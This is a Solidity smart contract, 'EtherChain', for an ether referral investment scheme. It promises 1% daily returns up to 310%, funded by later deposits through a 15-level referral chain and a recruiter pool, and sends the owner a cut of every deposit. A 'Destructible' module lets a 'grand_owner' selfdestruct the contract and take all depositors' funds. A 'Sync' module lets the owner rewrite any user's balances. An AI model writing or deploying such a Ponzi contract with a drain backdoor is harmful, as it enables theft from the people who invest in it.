1 /*! ether.chain3.sol | (c) 2020 Develop by BelovITLab LLC (smartcontract.ru), author @stupidlovejoy | SPDX-License-Identifier: MIT License */
2 
3 pragma solidity 0.6.8;
4 
5 
6 /*
7  * @dev Provides information about the current execution context, including the
8  * sender of the transaction and its data. While these are generally available
9  * via msg.sender and msg.data, they should not be accessed in such a direct
10  * manner, since when dealing with GSN meta-transactions the account sending and
11  * paying for execution may not be the actual sender (as far as an application
12  * is concerned).
13  *
14  * This contract is only required for intermediate, library-like contracts.
15  */
16 abstract contract Context {
17     function _msgSender() internal view virtual returns (address payable) {
18         return msg.sender;
19     }
20 
21     function _msgData() internal view virtual returns (bytes memory) {
22         this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
23         return msg.data;
24     }
25 }
26 
27 
28 /**
29  * @dev Contract module which provides a basic access control mechanism, where
30  * there is an account (an owner) that can be granted exclusive access to
31  * specific functions.
32  *
33  * By default, the owner account will be the one that deploys the contract. This
34  * can later be changed with {transferOwnership}.
35  *
36  * This module is used through inheritance. It will make available the modifier
37  * `onlyOwner`, which can be applied to your functions to restrict their use to
38  * the owner.
39  */
40 contract Ownable is Context {
41     address private _owner;
42 
43     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
44 
45     /**
46      * @dev Initializes the contract setting the deployer as the initial owner.
47      */
48     constructor () internal {
49         address msgSender = _msgSender();
50         _owner = msgSender;
51         emit OwnershipTransferred(address(0), msgSender);
52     }
53 
54     /**
55      * @dev Returns the address of the current owner.
56      */
57     function owner() public view returns (address) {
58         return _owner;
59     }
60 
61     /**
62      * @dev Throws if called by any account other than the owner.
63      */
64     modifier onlyOwner() {
65         require(_owner == _msgSender(), "Ownable: caller is not the owner");
66         _;
67     }
68 
69     /**
70      * @dev Leaves the contract without owner. It will not be possible to call
71      * `onlyOwner` functions anymore. Can only be called by the current owner.
72      *
73      * NOTE: Renouncing ownership will leave the contract without an owner,
74      * thereby removing any functionality that is only available to the owner.
75      */
76     function renounceOwnership() public virtual onlyOwner {
77         emit OwnershipTransferred(_owner, address(0));
78         _owner = address(0);
79     }
80 
81     /**
82      * @dev Transfers ownership of the contract to a new account (`newOwner`).
83      * Can only be called by the current owner.
84      */
85     function transferOwnership(address newOwner) public virtual onlyOwner {
86         require(newOwner != address(0), "Ownable: new owner is the zero address");
87         emit OwnershipTransferred(_owner, newOwner);
88         _owner = newOwner;
89     }
90 }
91 
92 
93 /**
94  * @dev Contract module which allows children to implement an emergency stop
95  * mechanism that can be triggered by an authorized account.
96  *
97  * This module is used through inheritance. It will make available the
98  * modifiers `whenNotPaused` and `whenPaused`, which can be applied to
99  * the functions of your contract. Note that they will not be pausable by
100  * simply including this module, only once the modifiers are put in place.
101  */
102 contract Pausable is Context {
103     /**
104      * @dev Emitted when the pause is triggered by `account`.
105      */
106     event Paused(address account);
107 
108     /**
109      * @dev Emitted when the pause is lifted by `account`.
110      */
111     event Unpaused(address account);
112 
113     bool private _paused;
114 
115     /**
116      * @dev Initializes the contract in unpaused state.
117      */
118     constructor () internal {
119         _paused = false;
120     }
121 
122     /**
123      * @dev Returns true if the contract is paused, and false otherwise.
124      */
125     function paused() public view returns (bool) {
126         return _paused;
127     }
128 
129     /**
130      * @dev Modifier to make a function callable only when the contract is not paused.
131      *
132      * Requirements:
133      *
134      * - The contract must not be paused.
135      */
136     modifier whenNotPaused() {
137         require(!_paused, "Pausable: paused");
138         _;
139     }
140 
141     /**
142      * @dev Modifier to make a function callable only when the contract is paused.
143      *
144      * Requirements:
145      *
146      * - The contract must be paused.
147      */
148     modifier whenPaused() {
149         require(_paused, "Pausable: not paused");
150         _;
151     }
152 
153     /**
154      * @dev Triggers stopped state.
155      *
156      * Requirements:
157      *
158      * - The contract must not be paused.
159      */
160     function _pause() internal virtual whenNotPaused {
161         _paused = true;
162         emit Paused(_msgSender());
163     }
164 
165     /**
166      * @dev Returns to normal state.
167      *
168      * Requirements:
169      *
170      * - The contract must be paused.
171      */
172     function _unpause() internal virtual whenPaused {
173         _paused = false;
174         emit Unpaused(_msgSender());
175     }
176 }
177 
178 
179 contract Destructible {
180     address payable public grand_owner;
181 
182     event GrandOwnershipTransferred(address indexed previous_owner, address indexed new_owner);
183 
184     constructor() public {
185         grand_owner = msg.sender;
186     }
187 
188     function transferGrandOwnership(address payable _to) external {
189         require(msg.sender == grand_owner, "Access denied (only grand owner)");
190         
191         grand_owner = _to;
192     }
193 
194     function destruct() external {
195         require(msg.sender == grand_owner, "Access denied (only grand owner)");
196 
197         selfdestruct(grand_owner);
198     }
199 }
200 
201 contract EtherChain is Ownable, Destructible, Pausable {
202     struct User {
203         uint256 cycle;
204         address upline;
205         uint256 referrals;
206         uint256 payouts;
207         uint256 direct_bonus;
208         uint256 pool_bonus;
209         uint256 match_bonus;
210         uint256 deposit_amount;
211         uint256 deposit_payouts;
212         uint40 deposit_time;
213         uint256 total_deposits;
214         uint256 total_payouts;
215         uint256 total_structure;
216     }
217 
218     mapping(address => User) public users;
219 
220     uint256[] public cycles;                        // ether
221     uint8[] public ref_bonuses;                     // 1 => 1%
222 
223     uint8[] public pool_bonuses;                    // 1 => 1%
224     uint40 public pool_last_draw = uint40(block.timestamp);
225     uint256 public pool_cycle;
226     uint256 public pool_balance;
227     mapping(uint256 => mapping(address => uint256)) public pool_users_refs_deposits_sum;
228     mapping(uint8 => address) public pool_top;
229 
230     uint256 public total_withdraw;
231     
232     event Upline(address indexed addr, address indexed upline);
233     event NewDeposit(address indexed addr, uint256 amount);
234     event DirectPayout(address indexed addr, address indexed from, uint256 amount);
235     event MatchPayout(address indexed addr, address indexed from, uint256 amount);
236     event PoolPayout(address indexed addr, uint256 amount);
237     event Withdraw(address indexed addr, uint256 amount);
238     event LimitReached(address indexed addr, uint256 amount);
239 
240     constructor() public {
241         ref_bonuses.push(30);
242         ref_bonuses.push(10);
243         ref_bonuses.push(10);
244         ref_bonuses.push(10);
245         ref_bonuses.push(10);
246         ref_bonuses.push(8);
247         ref_bonuses.push(8);
248         ref_bonuses.push(8);
249         ref_bonuses.push(8);
250         ref_bonuses.push(8);
251         ref_bonuses.push(5);
252         ref_bonuses.push(5);
253         ref_bonuses.push(5);
254         ref_bonuses.push(5);
255         ref_bonuses.push(5);
256 
257         pool_bonuses.push(40);
258         pool_bonuses.push(30);
259         pool_bonuses.push(20);
260         pool_bonuses.push(10);
261 
262         cycles.push(10 ether);
263         cycles.push(30 ether);
264         cycles.push(90 ether);
265         cycles.push(200 ether);
266     }
267 
268     receive() payable external whenNotPaused {
269         _deposit(msg.sender, msg.value);
270     }
271 
272     function _setUpline(address _addr, address _upline) private {
273         if(users[_addr].upline == address(0) && _upline != _addr && (users[_upline].deposit_time > 0 || _upline == owner())) {
274             users[_addr].upline = _upline;
275             users[_upline].referrals++;
276 
277             emit Upline(_addr, _upline);
278 
279             for(uint8 i = 0; i < ref_bonuses.length; i++) {
280                 if(_upline == address(0)) break;
281 
282                 users[_upline].total_structure++;
283 
284                 _upline = users[_upline].upline;
285             }
286         }
287     }
288 
289     function _deposit(address _addr, uint256 _amount) private {
290         require(users[_addr].upline != address(0) || _addr == owner(), "No upline");
291 
292         if(users[_addr].deposit_time > 0) {
293             users[_addr].cycle++;
294             
295             require(users[_addr].payouts >= this.maxPayoutOf(users[_addr].deposit_amount), "Deposit already exists");
296             require(_amount >= users[_addr].deposit_amount && _amount <= cycles[users[_addr].cycle > cycles.length - 1 ? cycles.length - 1 : users[_addr].cycle], "Bad amount");
297         }
298         else require(_amount >= 0.1 ether && _amount <= cycles[0], "Bad amount");
299         
300         users[_addr].payouts = 0;
301         users[_addr].deposit_amount = _amount;
302         users[_addr].deposit_payouts = 0;
303         users[_addr].deposit_time = uint40(block.timestamp);
304         users[_addr].total_deposits += _amount;
305         
306         emit NewDeposit(_addr, _amount);
307 
308         if(users[_addr].upline != address(0)) {
309             users[users[_addr].upline].direct_bonus += _amount / 10;
310 
311             emit DirectPayout(users[_addr].upline, _addr, _amount / 10);
312         }
313 
314         _pollDeposits(_addr, _amount);
315 
316         if(pool_last_draw + 1 days < block.timestamp) {
317             _drawPool();
318         }
319 
320         payable(owner()).transfer(_amount / 100);
321     }
322 
323     function _pollDeposits(address _addr, uint256 _amount) private {
324         pool_balance += _amount / 20;
325 
326         address upline = users[_addr].upline;
327 
328         if(upline == address(0)) return;
329         
330         pool_users_refs_deposits_sum[pool_cycle][upline] += _amount;
331 
332         for(uint8 i = 0; i < pool_bonuses.length; i++) {
333             if(pool_top[i] == upline) break;
334 
335             if(pool_top[i] == address(0)) {
336                 pool_top[i] = upline;
337                 break;
338             }
339 
340             if(pool_users_refs_deposits_sum[pool_cycle][upline] > pool_users_refs_deposits_sum[pool_cycle][pool_top[i]]) {
341                 for(uint8 j = i + 1; j < pool_bonuses.length; j++) {
342                     if(pool_top[j] == upline) {
343                         for(uint8 k = j; k <= pool_bonuses.length; k++) {
344                             pool_top[k] = pool_top[k + 1];
345                         }
346                         break;
347                     }
348                 }
349 
350                 for(uint8 j = uint8(pool_bonuses.length - 1); j > i; j--) {
351                     pool_top[j] = pool_top[j - 1];
352                 }
353 
354                 pool_top[i] = upline;
355 
356                 break;
357             }
358         }
359     }
360 
361     function _refPayout(address _addr, uint256 _amount) private {
362         address up = users[_addr].upline;
363 
364         for(uint8 i = 0; i < ref_bonuses.length; i++) {
365             if(up == address(0)) break;
366             
367             if(users[up].referrals >= i + 1) {
368                 uint256 bonus = _amount * ref_bonuses[i] / 100;
369                 
370                 users[up].match_bonus += bonus;
371 
372                 emit MatchPayout(up, _addr, bonus);
373             }
374 
375             up = users[up].upline;
376         }
377     }
378 
379     function _drawPool() private {
380         pool_last_draw = uint40(block.timestamp);
381         pool_cycle++;
382 
383         uint256 draw_amount = pool_balance / 10;
384 
385         for(uint8 i = 0; i < pool_bonuses.length; i++) {
386             if(pool_top[i] == address(0)) break;
387 
388             uint256 win = draw_amount * pool_bonuses[i] / 100;
389 
390             users[pool_top[i]].pool_bonus += win;
391             pool_balance -= win;
392 
393             emit PoolPayout(pool_top[i], win);
394         }
395         
396         for(uint8 i = 0; i < pool_bonuses.length; i++) {
397             pool_top[i] = address(0);
398         }
399     }
400 
401     function deposit(address _upline) payable external whenNotPaused {
402         _setUpline(msg.sender, _upline);
403         _deposit(msg.sender, msg.value);
404     }
405 
406     function withdraw() external whenNotPaused {
407         (uint256 to_payout, uint256 max_payout) = this.payoutOf(msg.sender);
408         
409         require(users[msg.sender].payouts < max_payout, "Full payouts");
410 
411         // Deposit payout
412         if(to_payout > 0) {
413             if(users[msg.sender].payouts + to_payout > max_payout) {
414                 to_payout = max_payout - users[msg.sender].payouts;
415             }
416 
417             users[msg.sender].deposit_payouts += to_payout;
418             users[msg.sender].payouts += to_payout;
419 
420             _refPayout(msg.sender, to_payout);
421         }
422         
423         // Direct payout
424         if(users[msg.sender].payouts < max_payout && users[msg.sender].direct_bonus > 0) {
425             uint256 direct_bonus = users[msg.sender].direct_bonus;
426 
427             if(users[msg.sender].payouts + direct_bonus > max_payout) {
428                 direct_bonus = max_payout - users[msg.sender].payouts;
429             }
430 
431             users[msg.sender].direct_bonus -= direct_bonus;
432             users[msg.sender].payouts += direct_bonus;
433             to_payout += direct_bonus;
434         }
435         
436         // Pool payout
437         if(users[msg.sender].payouts < max_payout && users[msg.sender].pool_bonus > 0) {
438             uint256 pool_bonus = users[msg.sender].pool_bonus;
439 
440             if(users[msg.sender].payouts + pool_bonus > max_payout) {
441                 pool_bonus = max_payout - users[msg.sender].payouts;
442             }
443 
444             users[msg.sender].pool_bonus -= pool_bonus;
445             users[msg.sender].payouts += pool_bonus;
446             to_payout += pool_bonus;
447         }
448 
449         // Match payout
450         if(users[msg.sender].payouts < max_payout && users[msg.sender].match_bonus > 0) {
451             uint256 match_bonus = users[msg.sender].match_bonus;
452 
453             if(users[msg.sender].payouts + match_bonus > max_payout) {
454                 match_bonus = max_payout - users[msg.sender].payouts;
455             }
456 
457             users[msg.sender].match_bonus -= match_bonus;
458             users[msg.sender].payouts += match_bonus;
459             to_payout += match_bonus;
460         }
461 
462         require(to_payout > 0, "Zero payout");
463         
464         users[msg.sender].total_payouts += to_payout;
465         total_withdraw += to_payout;
466 
467         payable(msg.sender).transfer(to_payout);
468 
469         emit Withdraw(msg.sender, to_payout);
470 
471         if(users[msg.sender].payouts >= max_payout) {
472             emit LimitReached(msg.sender, users[msg.sender].payouts);
473         }
474     }
475     
476     function drawPool() external onlyOwner {
477         _drawPool();
478     }
479     
480     function pause() external onlyOwner {
481         _pause();
482     }
483     
484     function unpause() external onlyOwner {
485         _unpause();
486     }
487 
488     function maxPayoutOf(uint256 _amount) pure external returns(uint256) {
489         return _amount * 31 / 10;
490     }
491 
492     function payoutOf(address _addr) view external returns(uint256 payout, uint256 max_payout) {
493         max_payout = this.maxPayoutOf(users[_addr].deposit_amount);
494 
495         if(users[_addr].deposit_payouts < max_payout) {
496             payout = (users[_addr].deposit_amount * ((block.timestamp - users[_addr].deposit_time) / 1 days) / 100) - users[_addr].deposit_payouts;
497             
498             if(users[_addr].deposit_payouts + payout > max_payout) {
499                 payout = max_payout - users[_addr].deposit_payouts;
500             }
501         }
502     }
503 
504     /*
505         Only external call
506     */
507     function userInfo(address _addr) view external returns(address upline, uint40 deposit_time, uint256 deposit_amount, uint256 payouts, uint256 direct_bonus, uint256 pool_bonus, uint256 match_bonus) {
508         return (users[_addr].upline, users[_addr].deposit_time, users[_addr].deposit_amount, users[_addr].payouts, users[_addr].direct_bonus, users[_addr].pool_bonus, users[_addr].match_bonus);
509     }
510 
511     function userInfoTotals(address _addr) view external returns(uint256 referrals, uint256 total_deposits, uint256 total_payouts, uint256 total_structure) {
512         return (users[_addr].referrals, users[_addr].total_deposits, users[_addr].total_payouts, users[_addr].total_structure);
513     }
514 
515     function contractInfo() view external returns(uint256 _total_withdraw, uint40 _pool_last_draw, uint256 _pool_balance, uint256 _pool_lider) {
516         return (total_withdraw, pool_last_draw, pool_balance, pool_users_refs_deposits_sum[pool_cycle][pool_top[0]]);
517     }
518 
519     function poolTopInfo() view external returns(address[4] memory addrs, uint256[4] memory deps) {
520         for(uint8 i = 0; i < pool_bonuses.length; i++) {
521             if(pool_top[i] == address(0)) break;
522 
523             addrs[i] = pool_top[i];
524             deps[i] = pool_users_refs_deposits_sum[pool_cycle][pool_top[i]];
525         }
526     }
527 }
528 
529 contract Sync is EtherChain {
530     bool public sync_close = false;
531 
532     function sync(address[] calldata _users, address[] calldata _uplines, uint256[] calldata _data) external onlyOwner {
533         require(!sync_close, "Sync already close");
534 
535         for(uint256 i = 0; i < _users.length; i++) {
536             address addr = _users[i];
537             uint256 q = i * 12;
538 
539             //require(users[_uplines[i]].total_deposits > 0, "No upline");
540 
541             if(users[addr].total_deposits == 0) {
542                 emit Upline(addr, _uplines[i]);
543             }
544 
545             users[addr].cycle = _data[q];
546             users[addr].upline = _uplines[i];
547             users[addr].referrals = _data[q + 1];
548             users[addr].payouts = _data[q + 2];
549             users[addr].direct_bonus = _data[q + 3];
550             users[addr].pool_bonus = _data[q + 4];
551             users[addr].match_bonus = _data[q + 5];
552             users[addr].deposit_amount = _data[q + 6];
553             users[addr].deposit_payouts = _data[q + 7];
554             users[addr].deposit_time = uint40(_data[q + 8]);
555             users[addr].total_deposits = _data[q + 9];
556             users[addr].total_payouts = _data[q + 10];
557             users[addr].total_structure = _data[q + 11];
558         }
559     }
560 
561     function syncGlobal(uint40 _pool_last_draw, uint256 _pool_cycle, uint256 _pool_balance, uint256 _total_withdraw, address[] calldata _pool_top) external onlyOwner {
562         require(!sync_close, "Sync already close");
563 
564         pool_last_draw = _pool_last_draw;
565         pool_cycle = _pool_cycle;
566         pool_balance = _pool_balance;
567         total_withdraw = _total_withdraw;
568 
569         for(uint8 i = 0; i < pool_bonuses.length; i++) {
570             pool_top[i] = _pool_top[i];
571         }
572     }
573 
574     function syncUp() external payable {}
575 
576     function syncClose() external onlyOwner {
577         require(!sync_close, "Sync already close");
578 
579         sync_close = true;
580     }
581 }